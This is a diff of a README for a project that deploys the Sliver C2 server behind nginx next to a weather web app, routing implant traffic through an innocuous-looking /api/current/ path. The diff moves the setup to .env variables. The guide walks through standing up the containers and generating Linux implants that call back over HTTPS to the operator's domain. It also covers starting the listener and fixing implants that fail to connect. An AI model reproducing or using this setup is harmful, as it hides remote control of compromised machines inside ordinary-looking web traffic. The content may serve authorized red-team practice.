@@ -31,9 +31,9 @@ This project demonstrates how Sliver C2 can be deployed alongside legitimate web
 ## Prerequisites
 
 - Docker and Docker Compose installed
-- Open ports 80 and 443 on your host
+- Open ports 80 and 443 on your host (or configure custom ports)
 - SSL certificates (self-signed certificates work for testing)
-- Domain name or IP address configured (default: `ubu.jon.devs`)
+- Domain name or IP address for your deployment
 
 ## Quick Start
 
@@ -44,35 +44,64 @@ git clone <your-repo-url>
 cd sliver-weather
 ```
 
-### 2. SSL Certificate Setup
+### 2. Configure Environment Variables
 
-Place your SSL certificates in `nginx/certs/`:
-- `ubu.jon.devs.crt` - SSL certificate
-- `ubu.jon.devs.key` - Private key
+Copy the environment template and configure it with your values:
 
-For testing, you can generate self-signed certificates:
+```bash
+cp env.template .env
+```
+
+Edit `.env` with your preferred editor and set the following required variables:
+
+```bash
+# Required: Your domain or IP address
+DOMAIN=your-domain-or-ip.com
+
+# SSL certificate names (will default to ${DOMAIN}.crt and ${DOMAIN}.key)
+SSL_CERT_NAME=${DOMAIN}.crt
+SSL_KEY_NAME=${DOMAIN}.key
+
+# Optional: Customize ports, paths, etc.
+# See env.template for all available options
+```
+
+**Important**: The `.env` file is gitignored and will not be committed to the repository. Each user must create their own `.env` file from the template.
+
+### 3. SSL Certificate Setup
+
+Generate SSL certificates matching your `DOMAIN` value:
 
 ```bash
 cd nginx/certs
 openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-  -keyout ubu.jon.devs.key \
-  -out ubu.jon.devs.crt \
-  -subj "/CN=ubu.jon.devs"
+  -keyout ${DOMAIN}.key \
+  -out ${DOMAIN}.crt \
+  -subj "/CN=${DOMAIN}"
 ```
 
-### 3. Start the Services
+**Note**: Replace `${DOMAIN}` with your actual domain or IP address, or use the value from your `.env` file.
+
+Alternatively, if you're using a domain, you can use Let's Encrypt or other certificate authorities.
+
+### 4. Start the Services
 
 ```bash
 docker compose up -d
 ```
 
-### 4. Access Sliver Server
+This will:
+- Build the nginx, weather, and sliver containers
+- Substitute environment variables in nginx configuration
+- Start all services
+
+### 5. Access Sliver Server
 
 ```bash
 docker compose exec -it sliver /bin/bash
 ```
 
-### 5. Start Sliver Server
+### 6. Start Sliver Server
 
 Inside the container:
 
@@ -80,31 +109,39 @@ Inside the container:
 /opt/sliver-server
 ```
 
-### 6. Generate an Implant
+### 7. Generate an Implant
 
-In the Sliver console, generate a Linux implant:
+In the Sliver console, generate a Linux implant using your configured domain:
 
 ```bash
-generate --http https://ubu.jon.devs:443/api/current/ --os linux --arch amd64 --save /home/sliver/builds
+generate --http ${SLIVER_C2_URL} --os linux --arch amd64 --save /home/sliver/builds
 ```
 
-**Note**: Replace `ubu.jon.devs` with your actual domain or IP address.
-
-### 7. Start HTTP Listener
-
-Start the HTTP listener on port 8080 (mapped through nginx):
+Or manually specify the URL (replace with your domain from `.env`):
 
 ```bash
-http --lport 8080 --lhost 0.0.0.0
+generate --http https://your-domain:443/api/current/ --os linux --arch amd64 --save /home/sliver/builds
+```
+
+**Note**: The `${SLIVER_C2_URL}` environment variable is automatically constructed from your `.env` file. You can also manually construct it as `https://${DOMAIN}:443${SLIVER_C2_PATH}`.
+
+### 8. Start HTTP Listener
+
+Start the HTTP listener on the configured port (default: 8080, mapped through nginx):
+
+```bash
+http --lport ${SLIVER_HTTP_PORT:-8080} --lhost 0.0.0.0
 ```
 
 ## Usage
 
 ### Accessing Services
 
-- **Weather App**: `https://your-domain/weather/`
-- **Weather API**: `https://your-domain/api/weather?q=<location>`
-- **Sliver C2 Endpoint**: `https://your-domain/api/current/` (for implants)
+All URLs use your configured `DOMAIN` from the `.env` file:
+
+- **Weather App**: `https://${DOMAIN}/weather/`
+- **Weather API**: `https://${DOMAIN}/api/weather?q=<location>`
+- **Sliver C2 Endpoint**: `https://${DOMAIN}${SLIVER_C2_PATH}` (default: `/api/current/`)
 
 ### Building Implants
 
@@ -142,28 +179,42 @@ docker compose down -v
 
 ## Configuration
 
+### Environment Variables
+
+The project uses environment variables for universal configuration. All configuration is done through the `.env` file:
+
+- **DOMAIN**: Your domain or IP address (required)
+- **SSL_CERT_NAME**: SSL certificate filename (defaults to `${DOMAIN}.crt`)
+- **SSL_KEY_NAME**: SSL private key filename (defaults to `${DOMAIN}.key`)
+- **SLIVER_HTTP_PORT**: Internal Sliver HTTP listener port (default: 8080)
+- **SLIVER_C2_PATH**: C2 endpoint path (default: `/api/current/`)
+- **SLIVER_C2_URL**: Full C2 URL for implant generation (auto-constructed)
+- **NGINX_HTTP_PORT**: External HTTP port (default: 80)
+- **NGINX_HTTPS_PORT**: External HTTPS port (default: 443)
+- **NETWORK_NAME**: Docker network name (default: `demo_net`)
+- **SLIVER_CONFIG_DIR**: Path to Sliver config on host (default: `${HOME}/.sliver`)
+- **BUILDS_DIR**: Path to builds directory (default: `./builds`)
+
+See `env.template` for all available options and descriptions.
+
 ### Nginx
 
-The nginx configuration is located at `nginx/nginx.conf`. Key settings:
+The nginx configuration template is located at `nginx/nginx.conf.template`. Environment variables are substituted at container startup:
 
 - HTTP to HTTPS redirect on port 80
 - SSL/TLS configuration for port 443
 - Routing rules for weather app and Sliver C2
-- Server name: `ubu.jon.devs` (update for your domain)
+- Server name and certificate paths use `${DOMAIN}` and SSL certificate variables
 
 ### Docker Compose
 
-The `docker-compose.yml` file defines:
+The `docker-compose.yml` file reads from `.env` and defines:
 
-- **nginx**: Exposes ports 80 and 443
+- **nginx**: Builds custom image with envsubst, exposes configured HTTP/HTTPS ports
 - **weather**: Weather application service
 - **sliver**: Sliver C2 server with volumes for config and builds
 
-### Environment Variables
-
-Sliver service environment variables:
-- `SLIVER_HTTP_PORT`: HTTP listener port (default: 8080)
-- `SLIVER_AUTOSTART_HTTP`: Auto-start HTTP listener (set to "1" to enable)
+All services use the `.env` file for configuration. The nginx service uses an entrypoint script that substitutes environment variables in the nginx configuration template at startup.
 
 ### Volumes
 
@@ -196,9 +247,11 @@ Sliver service environment variables:
 
 ### Implant Not Connecting
 
-- Verify the URL in the `generate` command matches your domain
-- Check that nginx is routing `/api/current/` correctly
+- Verify the URL in the `generate` command matches your `DOMAIN` from `.env`
+- Check that the `SLIVER_C2_PATH` matches the nginx routing configuration
+- Verify nginx is routing the C2 path correctly (check nginx logs)
 - Ensure the HTTP listener is active in Sliver
+- Confirm the listener port matches `SLIVER_HTTP_PORT` from `.env`
 
 ### Port Conflicts
 
@@ -210,10 +263,14 @@ Sliver service environment variables:
 ```
 sliver-weather/
 ├── docker-compose.yml      # Main orchestration file
+├── env.template            # Environment variables template
+├── .env                    # Your local environment config (gitignored)
+├── .gitignore              # Git ignore rules
 ├── nginx/
-│   ├── nginx.conf          # Nginx configuration
-│   ├── certs/              # SSL certificates
-│   └── Dockerfile          # Nginx Dockerfile (if custom)
+│   ├── nginx.conf.template # Nginx configuration template
+│   ├── docker-entrypoint.sh # Entrypoint for env substitution
+│   ├── certs/              # SSL certificates (gitignored)
+│   └── Dockerfile          # Nginx Dockerfile
 ├── weather/
 │   ├── Dockerfile          # Weather app Dockerfile
 │   ├── server.js           # Weather API server
@@ -222,7 +279,7 @@ sliver-weather/
 ├── sliver/
 │   ├── Dockerfile          # Sliver Dockerfile
 │   └── docker-entrypoint.sh # Entrypoint script
-├── builds/                 # Generated implants (created at runtime)
+├── builds/                 # Generated implants (gitignored, created at runtime)
 └── README.md              # This file
 ```
 
